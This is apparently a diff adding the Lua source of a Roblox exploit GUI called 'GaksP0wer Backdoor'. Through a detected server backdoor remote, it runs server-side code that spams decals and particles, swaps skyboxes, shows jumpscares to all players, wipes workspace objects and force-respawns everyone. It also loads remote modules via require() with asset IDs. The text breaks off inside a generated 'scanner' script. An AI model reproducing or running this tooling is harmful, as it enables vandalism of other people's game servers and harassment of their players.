+					TextBox4.TextColor3 = Color3.new(0, 0, 0)
+					TextBox4.TextScaled = true
+					TextBox4.Parent = Frame6
+					Instance.new("UICorner", TextBox4)
+					TextBox5 = Instance.new("TextBox")
+					TextBox5.Size = UDim2.new(0.9, 0, 0, 90)
+					TextBox5.Position = UDim2.new(0.05, 0, 0, 95)
+					TextBox5.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
+					TextBox5.ZIndex = 6
+					TextBox5.Font = RobotoMono
+					TextBox5.PlaceholderText = "Script Content..."
+					TextBox5.Text = ""
+					TextBox5.TextColor3 = Color3.new(0, 0, 0)
+					TextBox5.TextScaled = true
+					TextBox5.Parent = Frame6
+					Instance.new("UICorner", TextBox5)
+
+					local u151 = RobotoMono
+					local u152 = Frame6
+					local u153 = v30
+
+					function v154(p17, p18, p19)
+						local TextButton = nil
+						do
+							TextButton = Instance.new("TextButton")
+							TextButton.Size = UDim2.new(0.42, 0, 0, 40)
+							TextButton.Position = p18
+							TextButton.BackgroundColor3 = p19
+							TextButton.Text = p17
+							TextButton.Font = u151
+							TextButton.TextScaled = true
+							TextButton.TextColor3 = Color3.new(1, 1, 1)
+							TextButton.ZIndex = 7
+							TextButton.Parent = u152
+							Instance.new("UICorner", TextButton)
+							u153(TextButton)
+						end
+
+						return TextButton
+					end
+				end
+
+				local v155 = v154("SUBMIT", UDim2.new(0.049999999999954525, 0, 0, 195), Color3.fromRGB(0, 170, 0))
+				local MouseButton1Click = v154("CANCEL", UDim2.new(0.53, 0, 0, 195), Color3.fromRGB(170, 0, 0)).MouseButton1Click
+				local u157 = Frame6
+
+				MouseButton1Click:Connect(function()
+					u157.Visible = false
+				end)
+
+				local TextButton = Instance.new("TextButton")
+
+				TextButton.Size = UDim2.new(0, 45, 0, 45)
+				TextButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+				TextButton.Text = "+"
+				TextButton.Font = RobotoMono
+				TextButton.TextSize = 30
+				TextButton.TextColor3 = t3.Text
+				TextButton.Parent = ScrollingFrame
+				Instance.new("UICorner", TextButton)
+				v30(TextButton)
+
+				local MouseButton1Click17 = TextButton.MouseButton1Click
+				local u160 = TextBox4
+				local u161 = TextBox5
+				local u162 = Frame6
+
+				MouseButton1Click17:Connect(function()
+					do
+						u160.Text = ""
+						u161.Text = ""
+					end
+
+					u162.Visible = true
+				end)
+
+				local MouseButton1Click18 = v155.MouseButton1Click
+				local u164 = TextBox4
+				local u165 = TextBox5
+				local u166 = v143
+				local u167 = Frame6
+
+				MouseButton1Click18:Connect(function()
+					local Text = u164.Text
+					local Text2 = u165.Text
+
+					if Text ~= "" and Text2 ~= "" then
+						if not writefile then
+							u166(Text, Text2)
+							game:GetService("StarterGui"):SetCore("SendNotification", {
+								Title = "Warning",
+								Text = "File system not found, saved for this session.",
+								Duration = 4,
+							})
+						else
+							do
+								local u372 = Text
+								local u373 = Text2
+								pcall(function()
+									writefile("GaksP0werBackdoorSaves" .. "/" .. u372 .. ".txt", u373)
+								end)
+								u166(Text, Text2)
+							end
+
+							local v374 = Text .. " has been saved!"
+
+							game:GetService("StarterGui"):SetCore("SendNotification", {
+								Title = "Saved",
+								Text = v374,
+								Duration = 4,
+							})
+						end
+
+						u167.Visible = false
+
+						return
+					end
+
+					game:GetService("StarterGui"):SetCore("SendNotification", {
+						Title = "Error",
+						Text = "Name and Content cannot be empty!",
+						Duration = 4,
+					})
+				end)
+
+				if listfiles then
+					local _pcall = pcall
+					local u169 = v143
+
+					pcall(function()
+						for _, v in ipairs(listfiles("GaksP0werBackdoorSaves")) do
+							local v377 = v:gsub("GaksP0werBackdoorSaves/", ""):gsub(".txt", "")
+							local v378 = readfile(v)
+
+							u169(v377, v378)
+						end
+					end)
+				end
+
+				TextLabel = Instance.new("TextLabel")
+				TextLabel.Size = UDim2.new(1, 0, 0, 40)
+				TextLabel.BackgroundTransparency = 1
+				TextLabel.Text = "Custom SS Things"
+				TextLabel.Font = RobotoMono
+				TextLabel.TextSize = 24
+				TextLabel.Parent = Frame5
+
+				local spawn = task.spawn
+				local u172 = RunService
+
+				spawn(function()
+					local n21 = 0
+
+					while true do
+						n21 = n21 + 0.0025
+
+						if n21 > 1 then
+							n21 = 0
+						end
+
+						local color3 = Color3.fromHSV(n21, 0.8, 1)
+
+						if not TextLabel:IsA("UIStroke") or TextLabel.Name == "FixedOutline" then
+							if (TextLabel:IsA("TextLabel") or TextLabel:IsA("TextButton") or TextLabel:IsA("TextBox")) and TextLabel.Name == "RainbowText" then
+								TextLabel.TextColor3 = color3
+							end
+						else
+							TextLabel.Color = color3
+						end
+
+						u172.RenderStepped:Wait()
+					end
+				end)
+			end
+
+			local TextBox6 = Instance.new("TextBox")
+
+			TextBox6.Size = UDim2.new(0, 160, 0, 35)
+			TextBox6.Position = UDim2.new(0.05, 0, 0, 50)
+			TextBox6.BackgroundColor3 = t3.InnerBg
+			TextBox6.Font = RobotoMono
+			TextBox6.PlaceholderText = "DECAL ID"
+			TextBox6.Text = ""
+			TextBox6.TextColor3 = t3.Text
+			TextBox6.TextScaled = true
+			TextBox6.Parent = Frame5
+			Instance.new("UICorner", TextBox6)
+
+			local v174 = v84("DECAL SPAM", UDim2.new(0.04999999999999716, 0, 0, 90), UDim2.new(0, 160, 0, 35), Frame5, "visual")
+			local TextBox2 = Instance.new("TextBox")
+			TextBox2.Size = UDim2.new(0, 160, 0, 35)
+			TextBox2.Position = UDim2.new(0.37999999999999545, 0, 0, 50)
+			TextBox2.BackgroundColor3 = t3.InnerBg
+			TextBox2.Font = RobotoMono
+			TextBox2.PlaceholderText = "SKY ID"
+			TextBox2.Text = ""
+			TextBox2.TextColor3 = t3.Text
+			TextBox2.TextScaled = true
+			TextBox2.Parent = Frame5
+			Instance.new("UICorner", TextBox2)
+
+			local v176 = v84("SKYBOX", UDim2.new(0.38, 0, 0, 90), UDim2.new(0, 160, 0, 35), Frame5, "visual")
+			local TextBox3 = Instance.new("TextBox")
+			TextBox3.Size = UDim2.new(0, 140, 0, 35)
+			TextBox3.Position = UDim2.new(0.71, 0, 0, 50)
+			TextBox3.BackgroundColor3 = t3.InnerBg
+			TextBox3.Font = RobotoMono
+			TextBox3.PlaceholderText = "JUMP ID"
+			TextBox3.Text = ""
+			TextBox3.TextColor3 = t3.Text
+			TextBox3.TextScaled = true
+			TextBox3.Parent = Frame5
+			Instance.new("UICorner", TextBox3)
+
+			local v178 = v84("JUMPSCARE", UDim2.new(0.71, 0, 0, 90), UDim2.new(0, 140, 0, 35), Frame5, "visual")
+			local TextBox7 = Instance.new("TextBox")
+
+			TextBox7.Size = UDim2.new(0, 160, 0, 35)
+			TextBox7.Position = UDim2.new(0.049999999999954525, 0, 0, 135)
+			TextBox7.BackgroundColor3 = t3.InnerBg
+			TextBox7.Font = RobotoMono
+			TextBox7.PlaceholderText = "PARTICLE ID"
+			TextBox7.Text = ""
+			TextBox7.TextColor3 = t3.Text
+			TextBox7.TextScaled = true
+			TextBox7.Parent = Frame5
+			Instance.new("UICorner", TextBox7)
+
+			local v180 = v84("PARTICLE SPAM", UDim2.new(0.05, 0, 0, 175), UDim2.new(0, 160, 0, 35), Frame5, "visual")
+			local TextBox8 = Instance.new("TextBox")
+
+			TextBox8.Size = UDim2.new(0.9, 0, 0, 45)
+			TextBox8.Position = UDim2.new(0.05000000000001137, 0, 0, 225)
+			TextBox8.BackgroundColor3 = t3.InnerBg
+			TextBox8.Font = RobotoMono
+			TextBox8.PlaceholderText = "CUSTOM MESSAGE / HINT"
+			TextBox8.Text = ""
+			TextBox8.TextColor3 = t3.Text
+			TextBox8.TextScaled = true
+			TextBox8.Parent = Frame5
+			Instance.new("UICorner", TextBox8)
+
+			local v182 = v84("SEND MESSAGE & HINT", UDim2.new(0.05, 0, 0, 280), UDim2.new(0.9, 0, 0, 45), Frame5, "visual")
+			local u183 = v84("LOCK BACKDOOR", UDim2.new(0.05, 0, 0, 335), UDim2.new(0.9, 0, 0, 45), Frame5, "visual")
+
+			local MouseButton1Click = v174.MouseButton1Click
+			local u185 = TextBox6
+			local u186 = v91
+
+			MouseButton1Click:Connect(function()
+				local v382 = nil
+				do
+					v382 = 'for _,o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then for _,f in pairs(Enum.NormalId:GetEnumItems()) do local d=Instance.new("Decal",o) d.Texture="rbxassetid://'
+						.. u185.Text
+						.. '" d.Face=f end end end'
+				end
+
+				if not u89 then
+					return
+				end
+
+				u186(v382)
+			end)
+
+			local MouseButton1Click19 = v176.MouseButton1Click
+			local u188 = v91
+
+			MouseButton1Click19:Connect(function()
+				local v384 = nil
+				do
+					local TextBox2Text = TextBox2.Text
+					v384 = 'local s=Instance.new("Sky",game.Lighting) s.SkyboxBk="rbxassetid://'
+						.. TextBox2Text
+						.. '" s.SkyboxDn="rbxassetid://'
+						.. TextBox2Text
+						.. '" s.SkyboxFt="rbxassetid://'
+						.. TextBox2Text
+						.. '" s.SkyboxLf="rbxassetid://'
+						.. TextBox2Text
+						.. '" s.SkyboxRt="rbxassetid://'
+						.. TextBox2Text
+						.. '" s.SkyboxUp="rbxassetid://'
+						.. TextBox2Text
+						.. '" '
+				end
+
+				if not u89 then
+					return
+				end
+
+				u188(v384)
+			end)
+
+			local MouseButton1Click20 = v180.MouseButton1Click
+			local u190 = TextBox7
+			local u191 = v91
+
+			MouseButton1Click20:Connect(function()
+				local v387 = nil
+				do
+					v387 = 'for _,o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then local p=Instance.new("ParticleEmitter",o) p.Texture="rbxassetid://'
+						.. u190.Text
+						.. '" p.Rate=100 p.Speed=NumberRange.new(5,10) end end'
+				end
+
+				if not u89 then
+					return
+				end
+
+				u191(v387)
+			end)
+
+			local MouseButton1Click21 = v182.MouseButton1Click
+			local u193 = v91
+			local u194 = TextBox8
+
+			MouseButton1Click21:Connect(function()
+				local v389 = nil
+				do
+					local Text = u194.Text
+					v389 = '        local h = Instance.new("Hint", workspace); h.Text = "'
+						.. Text
+						.. '";\n        local m = Instance.new("Message", workspace); m.Text = "'
+						.. Text
+						.. '"\n        game:GetService("Debris"):AddItem(h, 3);\n        game:GetService("Debris"):AddItem(m, 3)\n        task.wait(8.9);\n        for _,p in pairs(game.Players:GetPlayers()) do pcall(function() p:LoadCharacter() end) end\n    '
+				end
+
+				if not u89 then
+					return
+				end
+
+				u193(v389)
+			end)
+
+			local MouseButton1Click22 = v178.MouseButton1Click
+			local u196 = v91
+
+			MouseButton1Click22:Connect(function()
+				local v392 = nil
+				do
+					v392 = '        for _, v in pairs(game.Players:GetPlayers()) do\n            task.spawn(function()\n                if v:FindFirstChild("PlayerGui") then\n                    local ng = Instance.new("ScreenGui", v.PlayerGui); ng.IgnoreGuiInset = true\n                    local ni = Instance.new("ImageLabel", ng); ni.Image = "rbxassetid://'
+						.. TextBox3.Text
+						.. '"; ni.Size = UDim2.new(1,0,1,0); ni.BackgroundTransparency = 1\n                    local s = Instance.new("Sound", ng); s.SoundId = "rbxassetid://6018028320"; s.Volume = 10; s:Play()\n                end\n            end)\n        end\n        task.wait(8.9); for _,p in pairs(game.Players:GetPlayers()) do pcall(function() p:LoadCharacter() end) end\n    '
+				end
+
+				if not u89 then
+					return
+				end
+
+				u196(v392)
+			end)
+
+			local MouseButton1Click23 = u183.MouseButton1Click
+			local u198 = LocalPlayer
+			local u199 = t2
+
+			MouseButton1Click23:Connect(function()
+				if not u89 then
+					game:GetService("StarterGui"):SetCore("SendNotification", {
+						Title = "Error",
+						Text = "Pls Scan First",
+						Duration = 4,
+					})
+
+					return
+				end
+
+				local v393 = '{"' .. u198.Name .. '", '
+
+				for _, v in pairs(u199) do
+					local _ = v393 .. '"' .. v .. '", '
+				end
+
+				pcall(function()
+					if not u89:IsA("RemoteEvent") then
+						task.spawn(function()
+							u89:InvokeServer('require(128382158548746).epic("%s")')
+						end)
+
+						return
+					end
+
+					u89:FireServer('require(128382158548746).epic("%s")')
+				end)
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "SUCCESS",
+					Text = "Closed Backdoor For Only GaksP0wer Backdoor Users",
+					Duration = 4,
+				})
+				u183.Text = "Closed Backdoor For Skids"
+				u183.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+			end)
+			local TextLabel2 = Instance.new("TextLabel")
+			TextLabel2.Size = UDim2.new(1, 0, 0, 40)
+			TextLabel2.BackgroundTransparency = 1
+			TextLabel2.Text = "Custom GUI Creator"
+			TextLabel2.Font = RobotoMono
+			TextLabel2.TextSize = 24
+			TextLabel2.Parent = Frame3
+
+			local spawn = task.spawn
+			local u202 = RunService
+
+			spawn(function()
+				local n27 = 0
+
+				while true do
+					n27 = n27 + 0.0025
+
+					if n27 > 1 then
+						n27 = 0
+					end
+
+					local color3 = Color3.fromHSV(n27, 0.8, 1)
+
+					if not TextLabel2:IsA("UIStroke") or TextLabel2.Name == "FixedOutline" then
+						if (TextLabel2:IsA("TextLabel") or TextLabel2:IsA("TextButton") or TextLabel2:IsA("TextBox")) and TextLabel2.Name == "RainbowText" then
+							TextLabel2.TextColor3 = color3
+						end
+					else
+						TextLabel2.Color = color3
+					end
+
+					u202.RenderStepped:Wait()
+				end
+			end)
+
+			local u203 = v84
+			local u204 = t3
+			local u205 = RobotoMono
+
+			function v206(p20, p21, p22)
+				local TextBox9 = nil
+				local u405 = nil
+				do
+					TextBox9 = Instance.new("TextBox")
+					TextBox9.Size = UDim2.new(0, 250, 0, 35)
+					TextBox9.Position = UDim2.new(0.05000000000001137, 0, 0, p20)
+					TextBox9.BackgroundColor3 = u204.InnerBg
+					TextBox9.Font = u205
+					TextBox9.PlaceholderText = p21
+					TextBox9.Text = ""
+					TextBox9.TextColor3 = u204.Text
+					TextBox9.TextScaled = true
+					TextBox9.Parent = p22
+					Instance.new("UICorner", TextBox9)
+					u405 = u203("APPLY", UDim2.new(0.5500000000000114, 0, 0, p20), UDim2.new(0, 150, 0, 35), p22, "visual")
+				end
+
+				u405.MouseButton1Click:Connect(function()
+					do
+						u405.Text = "APPLIED!"
+						task.wait(1)
+					end
+
+					u405.Text = "APPLY"
+				end)
+
+				return TextBox9
+			end
+		end
+		local u207 = v206(60, "GUI NAME", Frame3)
+		local u208 = v206(105, "GUI COLOR RGB", Frame3)
+
+		local v209 = v206(150, "DECAL ID", Frame3)
+		local v210 = v206(195, "SKYBOX ID", Frame3)
+		local u211 = v206(240, "JUMPSCARE ID", Frame3)
+
+		local v212 = v206(285, "PARTICLE ID", Frame3)
+		local u213 = v206(330, "CUSTOM MESSAGE", Frame3)
+
+		local v214 = v84("Create Gui", UDim2.new(0.049999999999954525, 0, 0, 380), UDim2.new(0.9, 0, 0, 50), Frame3, "visual")
+
+		v214.BackgroundColor3 = Color3.fromRGB(218, 133, 65)
+
+		local MouseButton1Click = v214.MouseButton1Click
+		local u216 = v209
+		local u217 = v210
+		local u218 = v212
+		local u219 = v26
+		local u220 = RunService
+		local u221 = RobotoMono
+		local u222 = v30
+		local u223 = v91
+
+		MouseButton1Click:Connect(function()
+			local v406 = u207.Text ~= "" and u207.Text or "My GaksP0wer GUI"
+			local v407, v408, v409 = u208.Text:match("(%d+)%s*,%s*(%d+)%s*,%s*(%d+)")
+			local color3 = Color3.fromRGB(tonumber(v407) or 50, tonumber(v408) or 50, tonumber(v409) or 50)
+			local Text = u216.Text
+			local Text3 = u217.Text
+			local Text4 = u211.Text
+			local Text5 = u218.Text
+			local Text6 = u213.Text
+			local ScreenGui2 = Instance.new("ScreenGui")
+
+			ScreenGui2.Name = v406
+			ScreenGui2.Parent = gethui and gethui() or game:GetService("CoreGui")
+
+			local Frame14 = Instance.new("Frame")
+
+			Frame14.Size = UDim2.new(0, 350, 0, 350)
+			Frame14.Position = UDim2.new(0.5, -175, 0.5, -175)
+			Frame14.BackgroundColor3 = color3
+			Frame14.Parent = ScreenGui2
+			Instance.new("UICorner", Frame14).CornerRadius = UDim.new(0, 10)
+			u219(Frame14)
+
+			local UIStroke = Instance.new("UIStroke", Frame14)
+
+			UIStroke.Thickness = 3
+
+			local spawn = task.spawn
+			local u420 = UIStroke
+
+			spawn(function()
+				local n30 = 0
+
+				while true do
+					n30 = n30 + 0.0025
+
+					if n30 > 1 then
+						n30 = 0
+					end
+
+					local color3_2 = Color3.fromHSV(n30, 0.8, 1)
+
+					if not u420:IsA("UIStroke") or u420.Name == "FixedOutline" then
+						if (u420:IsA("TextLabel") or u420:IsA("TextButton") or u420:IsA("TextBox")) and u420.Name == "RainbowText" then
+							u420.TextColor3 = color3_2
+						end
+					else
+						u420.Color = color3_2
+					end
+
+					u220.RenderStepped:Wait()
+				end
+			end)
+
+			local TextLabel5 = Instance.new("TextLabel")
+
+			TextLabel5.Size = UDim2.new(1, -40, 0, 40)
+			TextLabel5.Position = UDim2.new(0, 10, 0, 5)
+			TextLabel5.BackgroundTransparency = 1
+			TextLabel5.Text = v406
+			TextLabel5.Font = u221
+			TextLabel5.TextScaled = true
+			TextLabel5.TextColor3 = Color3.new(1, 1, 1)
+			TextLabel5.Parent = Frame14
+
+			local TextButton = Instance.new("TextButton")
+
+			TextButton.Size = UDim2.new(0, 30, 0, 30)
+			TextButton.Position = UDim2.new(1, -35, 0, 10)
+			TextButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+			TextButton.Text = "X"
+			TextButton.Font = u221
+			TextButton.TextColor3 = Color3.new(1, 1, 1)
+			TextButton.Parent = Frame14
+			Instance.new("UICorner", TextButton)
+			u222(TextButton)
+
+			local MouseButton1Click24 = TextButton.MouseButton1Click
+			local u424 = ScreenGui2
+
+			MouseButton1Click24:Connect(function()
+				u424:Destroy()
+			end)
+
+			local u425 = Frame14
+
+			local function v426(p23, p24, p25)
+				local n31 = 0
+				local TextButton2 = nil
+				local UIStroke2 = nil
+
+				repeat
+					if n31 == 1 then
+						TextButton2.BackgroundTransparency = 0.5
+						TextButton2.Text = p24
+						TextButton2.Font = u221
+						TextButton2.TextScaled = true
+						n31 = 2
+					end
+
+					if n31 == 0 then
+						TextButton2 = Instance.new("TextButton")
+						TextButton2.Size = UDim2.new(0.9, 0, 0, 40)
+						TextButton2.Position = UDim2.new(0.05, 0, 0, p23)
+						TextButton2.BackgroundColor3 = Color3.new(0, 0, 0)
+						n31 = 1
+					end
+
+					if n31 == 2 then
+						TextButton2.TextColor3 = Color3.new(1, 1, 1)
+						TextButton2.Parent = u425
+						Instance.new("UICorner", TextButton2)
+						UIStroke2 = Instance.new("UIStroke", TextButton2)
+						n31 = 3
+					end
+				until n31 == 3
+
+				UIStroke2.Thickness = 2
+				UIStroke2.Color = Color3.new(1, 1, 1)
+				u222(TextButton2)
+				TextButton2.MouseButton1Click:Connect(p25)
+			end
+
+			local u427 = Text
+
+			v426(55, "DECAL SPAM", function()
+				if u89 and u427 ~= "" then
+					u223(
+						'for _,o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then for _,f in pairs(Enum.NormalId:GetEnumItems()) do local d=Instance.new("Decal",o) d.Texture="rbxassetid://'
+							.. u427
+							.. '" d.Face=f end end end'
+					)
+				end
+			end)
+
+			local u428 = Text3
+
+			v426(105, "SKYBOX", function()
+				if u89 and u428 ~= "" then
+					u223(
+						'local s=Instance.new("Sky",game.Lighting) s.SkyboxBk="rbxassetid://'
+							.. u428
+							.. '" s.SkyboxDn="rbxassetid://'
+							.. u428
+							.. '" s.SkyboxFt="rbxassetid://'
+							.. u428
+							.. '" s.SkyboxLf="rbxassetid://'
+							.. u428
+							.. '" s.SkyboxRt="rbxassetid://'
+							.. u428
+							.. '" s.SkyboxUp="rbxassetid://'
+							.. u428
+							.. '" '
+					)
+				end
+			end)
+
+			local u429 = Text4
+
+			v426(155, "JUMPSCARE", function()
+				if u89 and u429 ~= "" then
+					u223(
+						'for _, v in pairs(game.Players:GetPlayers()) do task.spawn(function() if v:FindFirstChild("PlayerGui") then local ng = Instance.new("ScreenGui", v.PlayerGui); ng.IgnoreGuiInset = true; local ni = Instance.new("ImageLabel", ng); ni.Image = "rbxassetid://'
+							.. u429
+							.. '"; ni.Size = UDim2.new(1,0,1,0); ni.BackgroundTransparency = 1; local s = Instance.new("Sound", ng); s.SoundId = "rbxassetid://6018028320"; s.Volume = 10; s:Play() end end) end task.wait(8.9); for _,p in pairs(game.Players:GetPlayers()) do pcall(function() p:LoadCharacter() end) end'
+					)
+				end
+			end)
+
+			local u430 = Text5
+
+			v426(205, "PARTICLES", function()
+				if u89 and u430 ~= "" then
+					u223(
+						'for _,o in pairs(workspace:GetDescendants()) do if o:IsA("BasePart") then local p=Instance.new("ParticleEmitter",o) p.Texture="rbxassetid://'
+							.. u430
+							.. '" p.Rate=100 p.Speed=NumberRange.new(5,10) end end'
+					)
+				end
+			end)
+
+			local u431 = Text6
+
+			v426(255, "SEND MESSAGE & HINT", function()
+				if u89 and u431 ~= "" then
+					u223(
+						'local h = Instance.new("Hint", workspace); h.Text = "'
+							.. u431
+							.. '"; local m = Instance.new("Message", workspace); m.Text = "'
+							.. u431
+							.. '"; game:GetService("Debris"):AddItem(h, 3); game:GetService("Debris"):AddItem(m, 3); task.wait(8.9); for _,p in pairs(game.Players:GetPlayers()) do pcall(function() p:LoadCharacter() end) end'
+					)
+				end
+			end)
+
+			local v432 = v406 .. " created successfully!"
+
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = "Success",
+				Text = v432,
+				Duration = 4,
+			})
+		end)
+		local TextLabel3 = Instance.new("TextLabel")
+		TextLabel3.Size = UDim2.new(1, 0, 0, 40)
+		TextLabel3.BackgroundTransparency = 1
+		TextLabel3.Text = "Realm Creator"
+		TextLabel3.Font = RobotoMono
+		TextLabel3.TextSize = 24
+		TextLabel3.Parent = Frame4
+
+		local spawn = task.spawn
+		local u226 = RunService
+
+		spawn(function()
+			local n32 = 0
+
+			while true do
+				n32 = n32 + 0.0025
+
+				if n32 > 1 then
+					n32 = 0
+				end
+
+				local color3 = Color3.fromHSV(n32, 0.8, 1)
+
+				if not TextLabel3:IsA("UIStroke") or TextLabel3.Name == "FixedOutline" then
+					if (TextLabel3:IsA("TextLabel") or TextLabel3:IsA("TextButton") or TextLabel3:IsA("TextBox")) and TextLabel3.Name == "RainbowText" then
+						TextLabel3.TextColor3 = color3
+					end
+				else
+					TextLabel3.Color = color3
+				end
+
+				u226.RenderStepped:Wait()
+			end
+		end)
+
+		local u227 = t3
+		local u228 = RobotoMono
+		local u229 = Frame4
+
+		local function v230(p26, p27, p28)
+			local TextBox10 = nil
+			do
+				TextBox10 = Instance.new("TextBox")
+				TextBox10.Size = UDim2.new(0, 200, 0, 35)
+				TextBox10.Position = UDim2.new(0.05 + p26, 0, 0, p27)
+				TextBox10.BackgroundColor3 = u227.InnerBg
+				TextBox10.Font = u228
+				TextBox10.PlaceholderText = p28
+				TextBox10.Text = ""
+				TextBox10.TextColor3 = u227.Text
+				TextBox10.TextScaled = true
+			end
+
+			TextBox10.Parent = u229
+			Instance.new("UICorner", TextBox10)
+
+			return TextBox10
+		end
+
+		local v231 = v230(0, 70, "MESH ID 1")
+		local v232 = v230(0.4500000000000455, 70, "TEXTURE ID 1")
+		local v233 = v230(0, 120, "MESH ID 2")
+		local u234 = v230(0.45, 120, "TEXTURE ID 2")
+		local u235 = v230(0, 170, "MESH ID 3")
+		local u236 = v230(0.45, 170, "TEXTURE ID 3")
+		local u237 = v230(0, 220, "SKYBOX ID")
+		local u238 = v230(0.4500000000000455, 220, "THEME ID")
+		local u239 = v230(0, 270, "JUMPSCARE ID")
+
+		local v240 = v84("CREATE REALM", UDim2.new(0.05, 0, 0, 330), UDim2.new(0.9, 0, 0, 50), Frame4, "visual")
+
+		v240.BackgroundColor3 = Color3.fromRGB(218, 133, 65)
+
+		local MouseButton1Click25 = v240.MouseButton1Click
+		local u242 = v231
+		local u243 = v232
+		local u244 = v233
+		local u245 = LocalPlayer
+		local u246 = v91
+
+		MouseButton1Click25:Connect(function()
+			local Text = u242.Text
+			local Text7 = u243.Text
+			local Text8 = u244.Text
+			local Text9 = u234.Text
+			local Text10 = u235.Text
+			local Text11 = u236.Text
+			local Text12 = u237.Text
+			local Text13 = u238.Text
+			local Text14 = u239.Text
+			local v449 = '        for _, v in pairs(workspace:GetChildren()) do\n            if not v:IsA("Terrain") and not game.Players:GetPlayerFromCharacter(v) then\n                pcall(function() v:Destroy() end)\n            end\n        end\n\n        pcall(function()\n            local tId = "'
+				.. Text13
+				.. '"\n            if tId ~= "" then\n                local snd = Instance.new("Sound", workspace)\n                snd.SoundId = "rbxassetid://"..tId\n                snd.Volume = 1\n                snd.Looped = true\n                snd.Playing = true\n            end\n        end)\n\n        pcall(function()\n            require(101862331174216).epic("'
+				.. u245.Name
+				.. '", "'
+				.. Text14
+				.. '")\n        end)\n\n        task.wait(4)\n\n        pcall(function()\n            local sId = "'
+				.. Text12
+				.. '"\n            if sId ~= "" then\n                for _, oldSky in pairs(game.Lighting:GetChildren()) do\n                    if oldSky:IsA("Sky") then oldSky:Destroy() end\n                end\n                \n                local s = Instance.new("Sky", game.Lighting)\n                s.SkyboxBk = "rbxassetid://"..sId\n                s.SkyboxDn = "rbxassetid://"..sId\n                s.SkyboxFt = "rbxassetid://"..sId\n                s.SkyboxLf = "rbxassetid://"..sId\n                s.SkyboxRt = "rbxassetid://"..sId\n                s.SkyboxUp = "rbxassetid://"..sId\n            end\n        end)\n\n        local bp = Instance.new("Part", workspace)\n        bp.Name = "Baseplate"\n        bp.Size = Vector3.new(2048, 10, 2048)\n        bp.Position = Vector3.new(0, -5, 0)\n        bp.Anchored = true\n        bp.BrickColor = BrickColor.new("Dark stone grey")\n\n        local bpTopY = bp.Position.Y + (bp.Size.Y / 2)\n\n        local function makeRealmMesh(mid, tid, offsetX, offsetZ)\n            if mid == "" then return end\n            local p = Instance.new("Part", workspace)\n            p.Size = Vector3.new(4, 4, 4)\n            p.Position = Vector3.new(offsetX, bpTopY + (p.Size.Y / 2), offsetZ)\n            p.Anchored = true\n            \n            local m = Instance.new("SpecialMesh", p)\n            m.MeshType = Enum.MeshType.FileMesh\n            m.MeshId = "rbxassetid://"..tostring(mid)\n            if tid ~= "" then m.TextureId = "rbxassetid://"..tostring(tid) end\n            m.Scale = Vector3.new(3, 3, 3)\n        end\n\n        makeRealmMesh("'
+				.. Text
+				.. '", "'
+				.. Text7
+				.. '", 100, 0)\n        makeRealmMesh("'
+				.. Text8
+				.. '", "'
+				.. Text9
+				.. '", -100, 0)\n        makeRealmMesh("'
+				.. Text10
+				.. '", "'
+				.. Text11
+				.. '", 0, 100)\n\n        task.wait(3)\n        for _, plr in pairs(game.Players:GetPlayers()) do\n            pcall(function() plr:LoadCharacter() end)\n        end\n    '
+
+			if not u89 then
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Error",
+					Text = "Scan First!",
+					Duration = 4,
+				})
+
+				return
+			end
+
+			u246(v449)
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = "Realm Created",
+				Text = "Anti-Leave injected! Skybox & Meshes loading in 4s...",
+				Duration = 4,
+			})
+		end)
+	end
+
+	local TextLabel6 = Instance.new("TextLabel")
+
+	TextLabel6.Size = UDim2.new(1, 0, 0, 40)
+	TextLabel6.BackgroundTransparency = 1
+	TextLabel6.Text = "Custom Scanner Builder"
+	TextLabel6.Font = RobotoMono
+	TextLabel6.TextSize = 24
+	TextLabel6.Parent = Frame2
+
+	local spawn = task.spawn
+	local u249 = RunService
+
+	spawn(function()
+		local n34 = 0
+
+		while true do
+			n34 = n34 + 0.0025
+
+			if n34 > 1 then
+				n34 = 0
+			end
+
+			local color3 = Color3.fromHSV(n34, 0.8, 1)
+
+			if not TextLabel6:IsA("UIStroke") or TextLabel6.Name == "FixedOutline" then
+				if (TextLabel6:IsA("TextLabel") or TextLabel6:IsA("TextButton") or TextLabel6:IsA("TextBox")) and TextLabel6.Name == "RainbowText" then
+					TextLabel6.TextColor3 = color3
+				end
+			else
+				TextLabel6.Color = color3
+			end
+
+			u249.RenderStepped:Wait()
+		end
+	end)
+
+	local u250 = v206(60, "SCANNER NAME", Frame2)
+	local u251 = v206(105, "COLOR RGB (e.g. 255, 50, 50)", Frame2)
+	local u252 = v206(150, "FOUND HINT MESSAGE", Frame2)
+	local u253 = v84("CREATE & COPY SCRIPT", UDim2.new(0.05, 0, 0, 220), UDim2.new(0.9, 0, 0, 50), Frame2, "visual")
+
+	u253.BackgroundColor3 = Color3.fromRGB(218, 133, 65)
+	u253.MouseButton1Click:Connect(function()
+		local v452 = u250.Text ~= "" and u250.Text or "Custom Scanner"
+		local v453 = u252.Text ~= "" and u252.Text or "Backdoor Found GG!"
+		local v454, v455, v456 = u251.Text:match("(%d+)%s*,%s*(%d+)%s*,%s*(%d+)")
+		local v457 = v454 and (v455 and (v456 and string.format("%s, %s, %s", v454, v455, v456))) or "255, 145, 0"
+		local v458 = string.format(
+			'local LocalPlayer = game:GetService("Players").LocalPlayer\nlocal RunService = game:GetService("RunService")\nlocal CoreGui = gethui and gethui() or game:GetService("CoreGui")\n\nlocal SG = Instance.new("ScreenGui")\nSG.Name = "%s"\nSG.Parent = CoreGui\n\nlocal function makeDraggable(frame)\n    local dragging, dragInput, dragStart, startPos\n    frame.InputBegan:Connect(function(input)\n        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n            dragging = true; dragStart = input.Position; startPos = frame.Position\n            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)\n        end\n    end)\n    game:GetService("UserInputService").InputChanged:Connect(function(input)\n        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then\n            local delta = input.Position - 